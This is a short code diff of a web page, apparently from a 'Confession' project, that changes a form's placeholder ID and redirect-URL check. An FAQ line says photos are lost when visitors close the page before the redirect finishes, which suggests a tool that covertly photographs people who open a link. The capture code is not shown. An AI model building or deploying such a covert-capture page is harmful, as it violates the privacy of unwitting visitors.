@@ -11,7 +11,7 @@ function  create() {
     var kd = document.getElementById('kd');
     var myid = document.getElementById('myid');
     var url = document.getElementById('url');
-    if (myid.value=="canvas" || url.value=="https://raw.githubusercontent.com/butterbobo/Confession/refs/heads/Butter/Confession/sc.php"){
+    if (myid.value=="canvas" || url.value=="https://github.com/butterbobo/Confession/tree/Butter/Confession/img"){
         alert("ID或跳转地址不能为空！");
         return false;
     }
@@ -32,5 +32,6 @@ function  create() {
    <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
   </BODY>
 </HTML>
+
 
 
